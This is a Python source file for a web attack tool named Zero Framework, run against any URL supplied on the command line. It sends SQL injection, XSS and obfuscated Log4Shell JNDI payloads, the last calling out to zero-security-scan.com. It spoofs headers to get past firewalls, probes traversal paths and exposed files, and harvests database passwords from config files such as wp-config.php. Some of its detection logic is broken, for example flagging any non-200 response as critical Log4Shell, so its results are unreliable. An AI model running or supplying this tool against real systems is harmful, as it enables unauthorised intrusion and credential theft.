#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Zero Security Testing Framework
Advanced Web Security Testing Tool
Author: SayerLinux
Email: SayerLinux1@gmail.com
License: Educational Use Only
"""

import requests
import urllib3
import socket
import threading
import time
import random
import string
import re
import json
import sqlite3
import subprocess
import sys
import os
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup
import concurrent.futures
from datetime import datetime
import warnings

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings("ignore")

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

class ZeroFramework:
    def __init__(self):
        self.target_url = ""
        self.results = {}
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.vulnerabilities = []
        self.hidden_files = []
        self.db_credentials = []
        self.firewall_bypassed = False
        
    def banner(self):
        banner_text = f"""
{Colors.CYAN}{Colors.BOLD}
╔═══════════════════════════════════════════════════════════════╗
║                        Z E R O   F R A M E W O R K          ║
║                   Advanced Web Security Testing              ║
║                                                              ║
║  Author: SayerLinux                                          ║
║  Email: SayerLinux1@gmail.com                              ║
║  Version: 1.0.0                                            ║
╚═══════════════════════════════════════════════════════════════╝
{Colors.RESET}
        """
        print(banner_text)
    
    def set_target(self, url):
        """Set the target URL for testing"""
        if not url.startswith('http'):
            url = 'http://' + url
        self.target_url = url.rstrip('/')
        print(f"{Colors.GREEN}[+] Target set to: {self.target_url}{Colors.RESET}")
    
    def firewall_bypass(self):
        """Attempt to bypass firewall protections"""
        print(f"{Colors.YELLOW}[*] Attempting firewall bypass...{Colors.RESET}")
        
        bypass_headers = [
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Real-IP': '127.0.0.1'},
            {'X-Originating-IP': '127.0.0.1'},
            {'X-Remote-IP': '127.0.0.1'},
            {'X-Remote-Addr': '127.0.0.1'},
            {'X-Client-IP': '127.0.0.1'},
            {'X-Host': '127.0.0.1'},
            {'X-Forwarded-Host': '127.0.0.1'}
        ]
        
        for header in bypass_headers:
            try:
                response = self.session.get(self.target_url, headers=header, timeout=10, verify=False)
                if response.status_code == 200:
                    self.firewall_bypassed = True
                    print(f"{Colors.GREEN}[+] Firewall bypass successful with header: {header}{Colors.RESET}")
                    return True
            except:
                continue
        
        print(f"{Colors.RED}[-] Firewall bypass failed{Colors.RESET}")
        return False
    
    def discover_hidden_files(self):
        """Discover hidden files and directories"""
        print(f"{Colors.YELLOW}[*] Discovering hidden files...{Colors.RESET}")
        
        common_files = [
            'admin.php', 'admin.html', 'admin/', 'administrator/', 'wp-admin/',
            'config.php', 'config.bak', 'config.txt', '.env', '.htaccess',
            'robots.txt', 'sitemap.xml', 'backup/', 'backups/', 'uploads/',
            'database/', 'db/', 'sql/', 'logs/', 'log/', 'temp/', 'tmp/',
            '.git/', '.svn/', '.DS_Store', 'phpinfo.php', 'test.php',
            'info.php', 'phpmyadmin/', 'pma/', 'mysql/', 'secret/',
            'private/', 'internal/', 'dev/', 'development/', 'staging/'
        ]
        
        found_files = []
        for file in common_files:
            url = urljoin(self.target_url, file)
            try:
                response = self.session.get(url, timeout=5, verify=False)
                if response.status_code == 200:
                    found_files.append(url)
                    print(f"{Colors.GREEN}[+] Found: {url}{Colors.RESET}")
            except:
                continue
        
        self.hidden_files = found_files
        return found_files
    
    def test_sql_injection(self):
        """Test for SQL injection vulnerabilities"""
        print(f"{Colors.YELLOW}[*] Testing for SQL injection...{Colors.RESET}")
        
        # Basic SQL injection payloads
        sql_payloads = [
            "'", "' OR '1'='1", "' OR 1=1--", "' UNION SELECT 1--",
            "' AND 1=0 UNION SELECT user,password FROM users--",
            "' AND 1=0 UNION SELECT database(),user()--",
            "' AND 1=0 UNION SELECT table_name FROM information_schema.tables--",
            "' AND 1=0 UNION SELECT column_name FROM information_schema.columns--"
        ]
        
        # Test forms and parameters
        try:
            response = self.session.get(self.target_url, timeout=10, verify=False)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            forms = soup.find_all('form')
            for form in forms:
                action = form.get('action', '')
                method = form.get('method', 'get').lower()
                inputs = form.find_all('input')
                
                for payload in sql_payloads:
                    data = {}
                    for input_tag in inputs:
                        if input_tag.get('type') not in ['submit', 'button']:
                            name = input_tag.get('name')
                            if name:
                                data[name] = payload
                    
                    if data:
                        url = urljoin(self.target_url, action)
                        try:
                            if method == 'post':
                                res = self.session.post(url, data=data, timeout=5, verify=False)
                            else:
                                res = self.session.get(url, params=data, timeout=5, verify=False)
                            
                            if any(error in res.text.lower() for error in ['mysql', 'sql', 'syntax', 'error']):
                                vuln_info = {
                                    'type': 'SQL Injection',
                                    'url': url,
                                    'method': method,
                                    'payload': payload,
                                    'evidence': 'SQL error message detected'
                                }
                                self.vulnerabilities.append(vuln_info)
                                print(f"{Colors.RED}[!] SQL Injection found: {url}{Colors.RESET}")
                        except:
                            continue
        
        except Exception as e:
            print(f"{Colors.RED}[-] Error testing SQL injection: {e}{Colors.RESET}")
    
    def test_xss_vulnerabilities(self):
        """Test for XSS vulnerabilities"""
        print(f"{Colors.YELLOW}[*] Testing for XSS vulnerabilities...{Colors.RESET}")
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "'><script>alert('XSS')</script>",
            "\"<script>alert('XSS')</script>",
            "</script><script>alert('XSS')</script>"
        ]
        
        try:
            response = self.session.get(self.target_url, timeout=10, verify=False)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            forms = soup.find_all('form')
            for form in forms:
                action = form.get('action', '')
                method = form.get('method', 'get').lower()
                inputs = form.find_all(['input', 'textarea'])
                
                for payload in xss_payloads:
                    data = {}
                    for input_tag in inputs:
                        if input_tag.get('type') not in ['submit', 'button']:
                            name = input_tag.get('name')
                            if name:
                                data[name] = payload
                    
                    if data:
                        url = urljoin(self.target_url, action)
                        try:
                            if method == 'post':
                                res = self.session.post(url, data=data, timeout=5, verify=False)
                            else:
                                res = self.session.get(url, params=data, timeout=5, verify=False)
                            
                            if payload in res.text:
                                vuln_info = {
                                    'type': 'XSS',
                                    'url': url,
                                    'method': method,
                                    'payload': payload,
                                    'evidence': 'Payload reflected in response'
                                }
                                self.vulnerabilities.append(vuln_info)
                                print(f"{Colors.RED}[!] XSS found: {url}{Colors.RESET}")
                        except:
                            continue
        
        except Exception as e:
            print(f"{Colors.RED}[-] Error testing XSS: {e}{Colors.RESET}")
    
    def test_csrf_vulnerabilities(self):
        """Test for CSRF vulnerabilities"""
        print(f"{Colors.YELLOW}[*] Testing for CSRF vulnerabilities...{Colors.RESET}")
        
        try:
            response = self.session.get(self.target_url, timeout=10, verify=False)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            forms = soup.find_all('form')
            for form in forms:
                action = form.get('action', '')
                inputs = form.find_all('input')
                
                # Check for CSRF tokens
                csrf_found = False
                for input_tag in inputs:
                    name = input_tag.get('name', '').lower()
                    if any(token in name for token in ['csrf', 'token', '_token', 'nonce']):
                        csrf_found = True
                        break
                
                if not csrf_found:
                    vuln_info = {
                        'type': 'CSRF',
                        'url': urljoin(self.target_url, action),
                        'evidence': 'No CSRF token found in form'
                    }
                    self.vulnerabilities.append(vuln_info)
                    print(f"{Colors.RED}[!] CSRF vulnerability found: {urljoin(self.target_url, action)}{Colors.RESET}")
        
        except Exception as e:
            print(f"{Colors.RED}[-] Error testing CSRF: {e}{Colors.RESET}")
    
    def extract_database_info(self):
        """Attempt to extract database information"""
        print(f"{Colors.YELLOW}[*] Attempting database information extraction...{Colors.RESET}")
        
        # Common database paths
        db_paths = [
            'config.php', 'wp-config.php', 'database.php', 'db.php',
            'config/database.php', 'app/config/database.php',
            'application/config/database.php', 'sites/default/settings.php'
        ]
        
        for db_file in db_paths:
            url = urljoin(self.target_url, db_file)
            try:
                response = self.session.get(url, timeout=5, verify=False)
                if response.status_code == 200:
                    # Look for database credentials
                    patterns = [
                        r'database_host\s*=\s*["\']([^"\']+)["\']',
                        r'db_host\s*=\s*["\']([^"\']+)["\']',
                        r'mysql_host\s*=\s*["\']([^"\']+)["\']',
                        r'DB_HOST\s*=\s*["\']([^"\']+)["\']',
                        r'database_name\s*=\s*["\']([^"\']+)["\']',
                        r'db_name\s*=\s*["\']([^"\']+)["\']',
                        r'DB_NAME\s*=\s*["\']([^"\']+)["\']',
                        r'database_user\s*=\s*["\']([^"\']+)["\']',
                        r'db_user\s*=\s*["\']([^"\']+)["\']',
                        r'DB_USER\s*=\s*["\']([^"\']+)["\']',
                        r'database_password\s*=\s*["\']([^"\']+)["\']',
                        r'db_password\s*=\s*["\']([^"\']+)["\']',
                        r'DB_PASSWORD\s*=\s*["\']([^"\']+)["\']'
                    ]
                    
                    content = response.text
                    credentials = {}
                    for pattern in patterns:
                        matches = re.findall(pattern, content, re.IGNORECASE)
                        if matches:
                            credentials.update({pattern: matches})
                    
                    if credentials:
                        self.db_credentials.append({
                            'file': url,
                            'credentials': credentials
                        })
                        print(f"{Colors.GREEN}[+] Database credentials found in: {url}{Colors.RESET}")
            except:
                continue
    
    def zero_day_detection(self):
        """Detect zero-day vulnerabilities including Log4Shell"""
        print(f"{Colors.YELLOW}[*] Scanning for zero-day vulnerabilities including Log4Shell...{Colors.RESET}")

        # Log4Shell specific detection
        log4shell_payloads = [
            '${jndi:ldap://',
            '${jndi:rmi://',
            '${jndi:dns://',
            '${jndi:nis://',
            '${jndi:nds://',
            '${jndi:corba://',
            '${jndi:iiop://',
            '${${::-j}${::-n}${::-d}${::-i}:',
            '${${::-l}${::-d}${::-a}${::-p}://',
            '${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://'
        ]

        # Log4j version indicators
        log4j_indicators = [
            'log4j-core-2.0',
            'log4j-core-2.1',
            'log4j-core-2.2',
            'log4j-core-2.3',
            'log4j-core-2.4',
            'log4j-core-2.5',
            'log4j-core-2.6',
            'log4j-core-2.7',
            'log4j-core-2.8',
            'log4j-core-2.9',
            'log4j-core-2.10',
            'log4j-core-2.11',
            'log4j-core-2.12',
            'log4j-core-2.13',
            'log4j-core-2.14',
            'log4j-core-2.15',
            'log4j-core-2.16',
            'log4j-core-2.17',
            'apache-log4j',
            'log4j-api',
            'log4j-core'
        ]

        # JNDI injection patterns
        jndi_patterns = [
            'jndi:ldap://',
            'jndi:rmi://',
            'jndi:dns://',
            'jndi:nis://',
            'jndi:nds://',
            'jndi:corba://',
            'jndi:iiop://',
            'javax.naming.InitialContext',
            'javax.naming.directory.InitialDirContext'
        ]

        try:
            # Remote detection via HTTP headers and parameters
            test_payloads = [
                '${jndi:ldap://zero-security-scan.com/a}',
                '${${::-j}${::-n}${::-d}${::-i}:ldap://zero-security-scan.com/a}',
                '${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://zero-security-scan.com/a}'
            ]

            # Test common injection points
            injection_points = [
                {'name': 'User-Agent', 'value': test_payloads[0]},
                {'name': 'X-Forwarded-For', 'value': test_payloads[1]},
                {'name': 'Referer', 'value': test_payloads[2]},
                {'name': 'X-Api-Version', 'value': test_payloads[0]}
            ]

            for point in injection_points:
                headers = self.session.headers.copy()
                headers[point['name']] = point['value']

                try:
                    response = self.session.get(self.target_url, headers=headers, timeout=5, verify=False)

                    # Check for DNS callbacks or unusual responses
                    if response.status_code != 200 or 'zero-security-scan' in response.text:
                        self.vulnerabilities.append({
                            'type': 'Log4Shell (CVE-2021-44228)',
                            'description': f'Potential Log4Shell vulnerability detected via {point["name"]} header',
                            'url': self.target_url,
                            'severity': 'Critical',
                            'cve': 'CVE-2021-44228',
                            'payload_used': point['value']
                        })

                except:
                    pass

            # Static content analysis
            response = self.session.get(self.target_url, headers=self.session.headers, timeout=10, verify=False)
            content = response.text.lower()
            headers_text = str(response.headers).lower()

            # Check for vulnerable Log4j versions
            for version in log4j_indicators:
                if version.lower() in content or version.lower() in headers_text:
                    self.vulnerabilities.append({
                        'type': 'Log4Shell (Vulnerable Version)',
                        'description': f'Potentially vulnerable Log4j version detected: {version}',
                        'url': self.target_url,
                        'severity': 'Critical',
                        'cve': 'CVE-2021-44228'
                    })

            # Check for JNDI patterns in responses
            for pattern in jndi_patterns:
                if pattern.lower() in content:
                    self.vulnerabilities.append({
                        'type': 'JNDI Injection',
                        'description': f'JNDI injection pattern detected: {pattern}',
                        'url': self.target_url,
                        'severity': 'High'
                    })

            # Check for Log4Shell payload echoes
            for payload in log4shell_payloads:
                if payload.lower() in content:
                    self.vulnerabilities.append({
                        'type': 'Log4Shell (Payload Echo)',
                        'description': f'Log4Shell payload echoed in response: {payload}',
                        'url': self.target_url,
                        'severity': 'Critical',
                        'cve': 'CVE-2021-44228'
                    })

        except Exception as e:
            print(f"{Colors.RED}[-] Log4Shell detection failed: {e}{Colors.RESET}")

        # Local file detection
        self.scan_local_log4j_files()

    def scan_local_log4j_files(self):
        """Scan for local Log4j configuration and JAR files"""
        print(f"{Colors.YELLOW}[*] Scanning for local Log4j files...{Colors.RESET}")

        log4j_files = [
            'log4j2.xml',
            'log4j2.properties',
            'log4j2.json',
            'log4j2.yaml',
            'log4j.properties',
            'log4j.xml',
            'log4j-core-2.*.jar',
            'log4j-api-2.*.jar',
            'apache-log4j-*-bin.jar'
        ]

        # Common Log4j paths
        log4j_paths = [
            '/',
            '/var/log/',
            '/opt/',
            '/usr/local/',
            '/home/*/',
            '/app/',
            '/webapp/',
            '/WEB-INF/lib/',
            '/lib/',
            '/classes/'
        ]

        for log4j_file in log4j_files:
            # Check if file exists via directory traversal
            test_urls = [
                f"{self.target_url}/{log4j_file}",
                f"{self.target_url}/WEB-INF/{log4j_file}",
                f"{self.target_url}/classes/{log4j_file}",
                f"{self.target_url}/../{log4j_file}",
                f"{self.target_url}/../../{log4j_file}"
            ]

            for test_url in test_urls:
                try:
                    response = self.session.head(test_url, timeout=5, verify=False)
                    if response.status_code == 200:
                        self.vulnerabilities.append({
                            'type': 'Log4Shell (Local File Exposure)',
                            'description': f'Log4j configuration file accessible: {log4j_file}',
                            'url': test_url,
                            'severity': 'Medium',
                            'cve': 'CVE-2021-44228'
                        })

                except:
                    continue

    def scan_page_text_content(self):
        """Scan page content for specific text patterns (intext search)"""
        print(f"{Colors.YELLOW}[*] Scanning page text content for sensitive patterns...{Colors.RESET}")
        text_findings = []
        
        try:
            # Common sensitive text patterns to search for
            text_patterns = [
                'password', 'username', 'secret', 'key', 'token',
                'api_key', 'private', 'confidential', 'internal',
                'admin', 'root', 'database', 'mysql', 'backup',
                'ssh', 'ftp', 'login', 'auth', 'session'
            ]
            
            response = self.session.get(self.target_url, timeout=10, verify=False)
            content = response.text.lower()
            
            # Search for text patterns
            for pattern in text_patterns:
                if pattern in content:
                    # Find context around the pattern
                    start = max(0, content.find(pattern) - 50)
                    end = min(len(content), content.find(pattern) + len(pattern) + 50)
                    context = content[start:end].strip()
                    
                    text_findings.append({
                        'pattern': pattern,
                        'context': context,
                        'url': self.target_url,
                        'severity': 'high' if pattern in ['password', 'api_key', 'secret'] else 'medium'
                    })
                    
            if text_findings:
                print(f"{Colors.GREEN}[+] Found {len(text_findings)} text-based findings{Colors.RESET}")
                for finding in text_findings:
                    print(f"  - Pattern '{finding['pattern']}' found at {finding['url']}")
                    
        except Exception as e:
            print(f"{Colors.RED}[-] Error scanning text content: {e}{Colors.RESET}")
            
        return text_findings
    
    def generate_report(self):
        """Generate comprehensive security report"""
        text_findings = getattr(self, 'text_findings', [])
        
        report = {
            'target': self.target_url,
            'scan_date': datetime.now().isoformat(),
            'vulnerabilities': self.vulnerabilities,
            'hidden_files': self.hidden_files,
            'database_credentials': self.db_credentials,
            'firewall_bypassed': self.firewall_bypassed,
            'text_findings': text_findings,
            'total_vulnerabilities': len(self.vulnerabilities),
            'total_text_findings': len(text_findings)
        }
        
        # Save report to file
        filename = f"zero_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"\n{Colors.GREEN}[+] Report saved to: {filename}{Colors.RESET}")
        
        # Print summary
        print(f"\n{Colors.CYAN}{Colors.BOLD}=== SECURITY SCAN SUMMARY ==={Colors.RESET}")
        print(f"Target: {self.target_url}")
        print(f"Total Vulnerabilities Found: {len(self.vulnerabilities)}")
        print(f"Hidden Files Discovered: {len(self.hidden_files)}")
        print(f"Database Credentials Found: {len(self.db_credentials)}")
        print(f"Firewall Bypassed: {'Yes' if self.firewall_bypassed else 'No'}")
        print(f"Text-based Findings: {len(text_findings)}")
        
        if self.vulnerabilities:
            print(f"\n{Colors.RED}Vulnerabilities Found:{Colors.RESET}")
            for vuln in self.vulnerabilities:
                print(f"  - {vuln['type']} at {vuln['url']}")
        
        if text_findings:
            print(f"\n{Colors.YELLOW}Text-based Findings (intext search):{Colors.RESET}")
            for finding in text_findings[:5]:
                print(f"  - Pattern '{finding['pattern']}' found: {finding['context'][:100]}...")
            if len(text_findings) > 5:
                print(f"  ... and {len(text_findings) - 5} more text findings")
        
        return report
    
    def run_full_scan(self, target_url):
        """Run complete security scan"""
        self.banner()
        self.set_target(target_url)
        
        # Run all tests
        self.firewall_bypass()
        self.discover_hidden_files()
        self.test_sql_injection()
        self.test_xss_vulnerabilities()
        self.test_csrf_vulnerabilities()
        self.extract_database_info()
        self.zero_day_detection()
        text_findings = self.scan_page_text_content()
        
        # Generate report
        return self.generate_report()

def main():
    if len(sys.argv) != 2:
        print(f"{Colors.RED}Usage: python Zero.py <target_url>{Colors.RESET}")
        sys.exit(1)
    
    target = sys.argv[1]
    zero = ZeroFramework()
    zero.run_full_scan(target)

if __name__ == "__main__":
    main()